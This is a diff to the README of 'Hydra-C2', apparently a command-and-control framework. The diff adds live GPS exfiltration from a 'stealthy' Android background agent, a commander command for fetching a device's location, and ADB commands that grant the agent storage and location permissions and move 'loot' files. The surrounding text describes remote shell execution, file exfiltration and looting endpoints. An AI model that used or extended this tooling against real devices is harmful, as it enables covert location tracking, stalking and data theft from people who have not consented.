@@ -10,6 +10,8 @@
 
 
 ```
+---
+
 **Project Hydra-C2 is a multi-headed C2 (Command and Control) framework.**
 
 ---
@@ -34,6 +36,7 @@ The use of this framework for attacking targets without prior mutual consent is 
 * [x] Remote Shell Execution (Desktop Head)
 * [x] Multi-Platform Telemetry (RAM, OS, Battery, Network SSID)
 * [x] File Infiltration & Exfiltration (Download/Upload)
+* [x] **Live GPS Exfiltration (Fused Location Provider)**
 * [ ] Persistence Module (Systemd/Registry)
 
 ---
@@ -48,7 +51,7 @@ The brain of the operation, built with **Python & FastAPI**.
 * **Dynamic Intelligence:** Platform-aware logging (Mobile vs Desktop).
 * **Automated Tracking:** SQLite database tracking for all "Heads."
 * **Command Dispatcher:** Sends platform-specific JSON payloads.
-* **Output Collector:** Receives and logs remote shell results via `/report`.
+* **Output Collector:** Receives and logs remote shell results and GPS data via `/report`.
 * **File Manager**: Dedicated endpoints for /upload (Exfiltration) and /download (Looting).
 * **Path:** `/hydra_c2/`
 
@@ -57,6 +60,7 @@ The brain of the operation, built with **Python & FastAPI**.
 A stealthy background service built with **Kotlin**.
 
 * **Features:**
+* **Geospatial Intelligence:** High-accuracy coordinate retrieval (Lat, Lon, Alt).
 * **Network Intelligence:** Reports active SSID or Mobile Carrier name.
 * **Vitals Reporting:** Real-time Battery percentage and OS version tracking.
 * **Persistence:** Foreground Service with a `NotificationChannel` and `WakeLock`.
@@ -109,6 +113,13 @@ cargo run
 
 Use `commander.py` to inject tasks into the database.
 
+**Get GPS Location (Android):**
+
+```bash
+python commander.py ANDROID-HEAD-01 location
+
+```
+
 **Remote Shell (Desktop):**
 
 ```bash
@@ -159,14 +170,28 @@ On machines with AMD Vega/Integrated graphics, use **SwiftShader (CPU)** to avoi
 
 ```
 
-### 🔐 Permission Bypass
+### 🔐 Permission Bypass (Storage & Location)
 
-If exfiltration fails with `EACCES (Permission denied)`, use ADB to elevate the agent's permissions or move files to the private internal directory:
+If exfiltration fails or location returns null, use ADB to elevate the agent's permissions:
 
 ```bash
+# Storage Permissions
 adb root
 adb shell pm grant com.hydra.client android.permission.READ_EXTERNAL_STORAGE
 adb shell "mv /sdcard/Download/loot.txt /data/user/0/com.hydra.client/files/loot.txt"
+
+# Location Permissions
+adb shell pm grant com.hydra.client android.permission.ACCESS_FINE_LOCATION
+adb shell pm grant com.hydra.client android.permission.ACCESS_COARSE_LOCATION
+
+```
+
+### 🌍 Simulating GPS Movement
+
+If testing on a static emulator, force a coordinate update:
+
+```bash
+adb emu geo fix -31.4167 -64.1833
 
 ```
 
